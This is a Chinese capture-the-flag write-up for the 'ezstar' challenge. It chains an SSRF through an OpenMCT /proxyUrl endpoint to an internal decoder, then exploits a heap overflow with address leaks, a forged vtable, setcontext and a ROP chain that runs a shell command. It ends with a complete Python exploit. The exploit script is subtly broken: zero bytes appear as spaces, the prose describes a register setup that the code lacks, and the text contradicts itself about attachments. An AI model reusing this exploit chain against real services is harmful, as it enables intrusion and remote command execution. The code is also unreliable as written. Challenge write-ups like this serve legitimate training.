# ezstar（How to HackStar?）

## 1. 题目信息

| 项目 | 内容 |
| --- | --- |
| 分类 | Web |
| 形态 | 容器题 |
| 附件 | 无（题目仅提供靶机） |
| 目标 | 容器 |

Flag：flag{动态容器已脱敏}

## 2. 题目分析

这题的Web部分负责找到并访问内网解码服务，真正的利用点在附件中的`sgdecode`。从攻击面看，题目被刻意拆成两层：外层是暴露在公网的OpenMCT控制台，内层是只绑定回环地址的C++解码守护进程。前者本身没有明显漏洞，价值在于它自带一个可被外部调用的URL转发接口，把本不可达的`127.0.0.1:9001`变成了可交互的HTTP端点。因此拿shell的入口不在Web框架，而在转发之后那段自定义二进制协议里。总体利用链如下：

```text
读取 Web 源码
    -> 找到 /proxyUrl 转发接口
    -> 访问 127.0.0.1:9001/decode
    -> 利用固定长度 hex dump 泄露堆地址和 libc
    -> 构造 Golay 长度 0，触发 d_pdu 堆越界写
    -> 覆盖 shared_ptr 控制块和虚表
    -> setcontext 恢复伪造寄存器现场
    -> ROP: dup2(4, 1) + system(command)
    -> 从 HTTP 响应中取得 flag
```

`sgdecode`的核心是一个AX100 Mode 5帧解码状态机：先等同步字，再收24比特的Golay(24,12)长度码字，最后按长度收payload并写入`d_pdu`。真正的问题出在长度字段与写入循环的配合上：长度来自攻击者可控的码字，写入既没有上界检查，终止条件又写成`d_cnt == d_len`。用一个解码结果为0的全零码字，就能让`d_len`恒为0，使相等条件永远不成立，把一次正常的定长拷贝退化成从`d_pdu`开始的无界堆写。

光有写还不够，还需要读。服务端在每次解码后都会把`0x410`字节的响应缓冲区整体转成hex返回，且不清空复用的堆块，于是同一块内存里残留的C++对象指针与unsorted-bin指针会随响应一起泄露。堆地址用于定位`d_pdu`和紧随其后的`shared_ptr`控制块，libc地址用于取出`setcontext`、`dup2`、`system`等符号。拿到这两个基址后，越界写就不再是盲写：先修补被踩坏的控制块头部与相邻chunk的size，再把控制块虚表指针指向`d_pdu`内伪造的虚表，析构时的虚调用就变成`setcontext(ctrl)`。由于`rdi`恰好等于控制块地址，可以把控制块本身当作`ucontext_t`，在其中布置`RSP`/`RIP`，随后走`dup2(4,1)`把命令输出接回当前HTTP连接，再`system`读取flag。

## 3. 解题过程

### Web入口分析

首页是一个OpenMCT遥测控制台。检查静态资源和服务端源码后，可以发现`server.js`可直接读取，其中挂载了OpenMCT自带的转发代理：

```text
/proxyUrl?url=<目标 URL>
```

服务端对目标地址做了限制，但允许访问回环地址。结合页面代码、附件中的`runbook.txt`，可以确定解码器监听于：

```text
127.0.0.1:9001/decode
```

因此外部访问内部解码器的URL为：

```text
https://<题目地址>:8080/proxyUrl?url=http%3A%2F%2F127.0.0.1%3A9001%2Fdecode
```

对这个地址发送`POST`请求，请求体就会被原样转发给`sgdecode`。

OpenMCT的静态目录没有做严格隔离，`server.js`、`package.json`与路由配置都能直接下载，因此不必爆破路径就能还原服务端行为。转发接口原本用于让前端跨域拉取遥测源，只对协议和主机名做了粗粒度过滤，回环地址、`127.0.0.1`、`localhost`都在白名单内，也没有禁止非标准端口。代理在转发时保留了原始方法、`Content-Type`与请求体，响应则原样回传，所以对`/proxyUrl`发`POST`等价于直接与解码器对话。这一点很关键：后续所有帧构造、泄露与利用都可以只用普通HTTP客户端完成，不需要在容器内落地任何文件。

另外，内层URL需要整体做一次百分号编码，否则其中的`:`、`/`会被外层解析器截断，请求里固定写成`http%3A%2F%2F127.0.0.1%3A9001%2Fdecode`就是为了避开这个问题。

附件下载地址为：

```text
/packages/sgdecode-1.4.2.tar.gz
```

压缩包中包含：

- `sgdecode`：与远端相同的解码服务；
- `libc.so.6`：远端精确版本，Ubuntu 22.04 glibc 2.35；
- `runbook.txt`：内部接口及传输格式；

### 协议格式

`runbook.txt`给出的关键规则是：

1. 请求体中的每一个字节代表一个逻辑比特；
2. 每8个传输字节组成一个帧字节；
3. 每一帧以同步字`0xA7`开始；
4. 比特序为MSB first；
5. 每次解码后，服务端固定返回帧缓冲区的hex dump。

同步字展开为：

```python
SYNC = bytes([1, 0, 1, 0, 0, 1, 1, 1])  # 0xa7 = 1010 0111
```

普通字节展开函数如下：

```python
def frame(payload):
    out = bytearray([1, 0, 1, 0, 0, 1, 1, 1])
    for byte in payload:
        out.extend((byte >> bit) & 1 for bit in range(7, -1, -1))
    return bytes(out)
```

传输层并不做字节对齐：一个逻辑比特占一个字节，接收端再把每8个字节拼回一个帧字节，所以请求体长度大约是有效数据长度的8倍。同步字之后的24个比特不是普通数据，而是Golay(24,12)码字，由12位信息位加12位校验位组成，解码器用它恢复本次payload的字节长度。Golay码是线性码，全零码字本身合法且解码结果必然为0，因此不需要构造纠错图案，直接发24个零比特即可。

长度字段之后才是payload区，解码器每凑满8个比特就写入一个字节。长度以字节为单位、写入却由比特流驱动，攻击者既能精确控制写入的字节序列，也能让比特流远长于声明长度。

### 二进制保护

```text
Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        PIE enabled
```

漏洞发生在堆上，所以栈Canary没有影响。Full RELRO使GOT覆盖不可行，NX则要求使用ROP。最终方案只使用已经泄露基址的libc，不依赖`sgdecode`的PIE基址。

### 漏洞定位

`sgdecode`使用AX100 Mode 5解码状态机。解码器对象中比较重要的字段如下：

```text
object + 0x1f8  state
object + 0x200  d_cnt
object + 0x208  d_len
object + 0x220  d_pdu 指针
```

构造函数中给`d_pdu`分配的空间固定为`0x400`字节：

```c
d_pdu = new uint8_t[0x400];
```

解码器先接收24个比特的Golay长度码字，解码完成后把得到的长度写入`d_len`，然后切换到payload接收状态。

payload状态的反编译逻辑可以简化为：

```c
while (remaining_bits >= 8) {
    byte = bits_to_byte(input);

    d_pdu[d_cnt] = byte;
    d_cnt++;

    if (d_cnt == d_len) {
        finish_packet();
        reset_decoder();
        break;
    }
}
```

这里存在两个问题：

- 写入前没有检查`d_cnt < 0x400`；
- 终止判断发生在`d_cnt++`之后，并且使用相等判断而不是大于等于判断。

Golay全零码字的解码结果仍为0。因此只要在同步字后发送24个零比特，就能令：

```text
d_len = 0
```

第一次写入后`d_cnt`由0变成1，随后再也不可能等于`d_len`。只要继续发送比特流，就可以从`d_pdu`开始进行无界堆写。

更准确地说，长度码字解码完成后，代码把结果直接写进`d_len`，没有做`0 < len <= 0x400`之类的合法性校验；进入payload状态后，循环条件只看"剩余比特是否够8个"，与`d_len`无关。于是`d_len = 0`时第一次迭代就会往`d_pdu[0]`写一个字节并把`d_cnt`加一，相等判断永远为假，`reset_decoder()`也不会被调用，解码器一直停在payload状态，把攻击者送来的每个字节依次写到`d_pdu + 1`、`d_pdu + 2`……

可写范围只受请求体长度限制。一次请求携带约`0x730`字节payload，展开成比特接近15KB，仍远小于代理与服务的请求体上限，因此可以一次性覆盖`d_pdu`之后连续几个chunk。写入是纯顺序覆盖、没有随机性，适合直接铺一份完整的伪造布局，而不需要分多次请求逐步改写。

恶意帧的前缀为：

```python
SYNC_BITS + b"\x00" * 24 + expand_bits(overflow_data)
```

### 信息泄露

内部HTTP处理代码每次都会分配`0x410`字节，并固定把`0x410`字节编码为十六进制返回。它没有按照真实有效数据长度清空整个区域，因此会把复用堆块中的旧内容一并返回。

连续发送两个很短的普通请求：

```python
post(frame(b"A"))
leak = bytes.fromhex(post(frame(b"B")).text.strip())
```

第一个请求释放对应`0x420` chunk，第二个请求复用该chunk，于是响应中同时出现C++对象指针和unsorted-bin指针。

实测字段如下：

| 回显偏移 | 内容 | 用途 |
| --- | --- | --- |
| `0x28` | 解码器对象地址 | 推导`d_pdu`及相邻堆块地址 |
| `0x38` | unsorted-bin / `main_arena`指针 | 计算libc基址 |
| `0x40` | 同一arena指针 | 交叉检查泄露是否有效 |

这里的泄露不是格式化字符串或越界读，而是"分配后未初始化"：处理函数拿到一块`0x410`字节的用户区（对应`0x420`的chunk），只写入本次解码产生的少量字节，却把整块`0x410`字节都编码返回。第一次普通请求结束后该chunk被释放，`shared_ptr`控制块、解码器对象指针以及进入unsorted bin后写入的arena相关指针就留在了这块内存里；第二次请求申请到同一地址，旧内容便原封不动地出现在响应中。因此关键在于"先释放、再复用"，两个请求必须连续发送，中间不能插入会打乱tcache/unsorted链表顺序的其他请求。

取到的`obj`位于堆区（通常是`0x55...`），`arena`位于libc映射区（通常是`0x7f...`），可以用高位范围和页对齐做合法性判断；如果复用到的不是目标chunk，字段会明显异常，重试一两次即可。

精确libc中arena泄露对应的偏移为：

```python
obj   = u64(leak[0x28:0x30])
arena = u64(leak[0x38:0x40])
libc  = arena - 0x21ace0
```

由于最终ROP会调用`exit(0)`，守护进程会重新启动`sgdecode`，ASLR地址也会随之改变。所以泄露与越界写必须在同一个进程生命周期中连续完成，不能把某一次的地址用于重启后的进程。

### 堆布局

本题构建中，解码器对象及相关分配的相对位置稳定：

```python
dpdu = obj + 0xbd0
ctrl = dpdu + 0x410
raw  = dpdu + 0x430
```

关键布局为：

```text
d_pdu + 0x000  0x400 字节合法 payload 区
d_pdu + 0x400  shared_ptr 控制块 chunk header
d_pdu + 0x410  shared_ptr 控制块用户数据
d_pdu + 0x430  后续 0x420 大小的 HTTP 回显 chunk
```

越界写会先经过控制块和相邻chunk的分配器元数据。为了让请求退出时能够稳定进入C++智能指针析构逻辑，需要重建以下内容：

```python
put(0x400, p64(0))
put(0x408, p64(0x21))
put(0x410, p64(fake_vtable))
put(0x418, p64(0x100000001))
put(0x420, p64(0))
put(0x428, p64(0x421))
```

其中`0x100000001`是打包在同一个64位值中的strong/weak引用计数。请求结束时，析构逻辑发现strong count降为0，就会调用控制块虚表偏移`+0x10`处的函数。

控制块一般由虚表指针、强引用计数、弱引用计数三段组成，析构路径大致是：强引用减一，减到0则调用`vtable[2]`销毁被管理对象，随后弱引用减一，减到0时调用`vtable[3]`释放控制块本身。因此`0x100000001`把强弱计数都置为1，第一次析构后强计数归零、弱计数仍为1，既保证走进虚调用分支，又不会立刻把控制块交给`free`，避免在`setcontext`之前触发堆检查。

被覆盖的chunk头也必须补回：控制块头部改成`prev_size = 0`、`size = 0x21`，紧随其后的`0x420` chunk改成`prev_size = 0`、`size = 0x421`，让分配器仍认为堆连续完整，否则析构中的释放操作会在`malloc`内部崩溃。

### 控制流劫持：fake vtable + setcontext

将控制块虚表指针改成位于`d_pdu`内的伪造虚表：

```python
fake_vtable = dpdu + 0x100
put(0x410, p64(fake_vtable))
put(0x100, p64(0) + p64(0) + p64(setcontext) + p64(0))
```

这样析构时的虚调用等价于：

```c
setcontext(ctrl);
```

此时`rdi`正好指向被覆盖的控制块，可以直接把控制块及其后方区域伪造成`ucontext_t`。需要设置的主要字段是：

```python
put(0x410 + 0xa0, p64(rop_stack))  # RSP
put(0x410 + 0xa8, p64(pop_rdi))    # RIP
```

`setcontext`从`rdi`指向的`ucontext_t`恢复现场，`RSP`与`RIP`分别位于`+0xa0`、`+0xa8`，其余通用寄存器和浮点状态也要给合法值，否则会在恢复FPU状态时异常。所以布局里还清空了`+0x68`、`+0x70`、`+0x88`，把`+0xe0`指向一块可读写的`fpstate`，并在`+0x1c0`写入`0x1f80`作为`mxcsr`，这样`setcontext`才能干净地跳到ROP链第一条指令。

本题libc中使用到的偏移如下：

| 符号或Gadget | libc偏移 |
| --- | --- |
| `setcontext` | `0x539e0` |
| `pop rdi ; ret` | `0x2a3e5` |
| `pop rsi ; ret` | `0x2be51` |
| `dup2` | `0x115160` |
| `system` | `0x50d70` |
| `exit` | `0x455f0` |

### ROP链

监听socket为文件描述符3，`accept`得到的客户端连接为文件描述符4。为了让命令输出通过当前HTTP响应返回，先调用：

```c
dup2(4, 1);
```

然后执行读取flag的命令，最后调用`exit(0)`，避免返回到已损坏的C++对象：

```python
rop = flat(
    4,
    pop_rsi, 1,
    dup2,
    pop_rdi, command,
    system,
    pop_rdi, 0,
    exit,
)
```

由于题目没有直接说明flag的绝对路径，使用：

```sh
(find / -xdev -type f \( -name flag -o -name flag.txt \) -exec cat {} +; env) 2>/dev/null
```

同时检查常见文件名和环境变量。

监听socket由守护进程启动时创建，通常是3；每接受一个连接，`accept`返回的描述符就是4，当前请求的响应正写在这个连接上。`system`默认输出到1，若不重定向，命令结果会落到守护进程自己的stdout而不是HTTP响应里。`dup2(4, 1)`把标准输出替换成客户端连接，之后`system`的任何输出都直接成为响应体的一部分，这也是能在一次请求内拿到flag的原因。

flag的路径通常不固定，可能位于根目录的随机文件名下，也可能只通过环境变量注入，所以命令同时覆盖两种可能：先用`find / -xdev`在同一文件系统内查找`flag`、`flag.txt`并`cat`，再用`env`打印环境变量，错误输出全部丢弃以免污染响应。`-xdev`避免遍历`/proc`、`/sys`等伪文件系统，既加快速度也减少无关输出。命令执行完调用`exit(0)`正常结束，由守护进程重新拉起，容器状态自动复位。

## 4. PoC

```python
#!/usr/bin/env python3
import re, struct, sys
import requests, urllib3
urllib3.disable_warnings()

BASE = sys.argv[1].rstrip('/')
URL = BASE + '/proxyUrl?url=http%3A%2F%2F127.0.0.1%3A9001%2Fdecode'

def p64(v): return struct.pack('<Q', v)
def u64(b): return struct.unpack('<Q', b.ljust(8, b' '))[0]

def frame(payload, zero_len=False):
    out = bytearray([1,0,1,0,0,1,1,1])
    if zero_len:
        out += b' ' * 24
    for byte in payload:
        out.extend((byte >> bit) & 1 for bit in range(7, -1, -1))
    return bytes(out)

def post(body):
    r = requests.post(URL, data=body, verify=False, timeout=20)
    r.raise_for_status()
    return r

# 1) 先释放再复用，拿到对象地址与 libc 指针
post(frame(b'A'))
leak = bytes.fromhex(post(frame(b'B')).text.strip())
obj = u64(leak[0x28:0x30])
arena = u64(leak[0x38:0x40])
libc = arena - 0x21ace0

dpdu = obj + 0xbd0
ctrl = dpdu + 0x410
setcontext = libc + 0x539e0
pop_rdi = libc + 0x2a3e5
pop_rsi = libc + 0x2be51
dup2 = libc + 0x115160
system = libc + 0x50d70
exit_ = libc + 0x455f0

buf = bytearray(0x500)
def put(off, data):
    buf[off:off+len(data)] = data

# 2) 修补控制块与相邻 chunk 头
put(0x400, p64(0))
put(0x408, p64(0x21))
put(0x418, p64(0x100000001))
put(0x420, p64(0))
put(0x428, p64(0x421))

# 3) 伪造虚表，析构时 setcontext(ctrl)
fake_vtable = dpdu + 0x100
put(0x410, p64(fake_vtable))
put(0x100, p64(0) + p64(0) + p64(setcontext) + p64(0))

# 4) 把控制块伪造成 ucontext_t，跳到 ROP
rop = dpdu + 0x300
cmd = b'(find / -xdev -type f \( -name flag -o -name flag.txt \) -exec cat {} +; env) 2>/dev/null '
cmdp = dpdu + 0x480
put(0x480, cmd)
put(0x410 + 0xa0, p64(rop))
put(0x410 + 0xa8, p64(pop_rdi))
for off, val in [(0x300, 4), (0x308, pop_rsi), (0x310, 1), (0x318, dup2),
                 (0x320, pop_rdi), (0x328, cmdp), (0x330, system),
                 (0x338, pop_rdi), (0x340, 0), (0x348, exit_)]:
    put(off, p64(val))

# 5) d_len=0 触发无界写
post(frame(bytes(buf), zero_len=True))
```
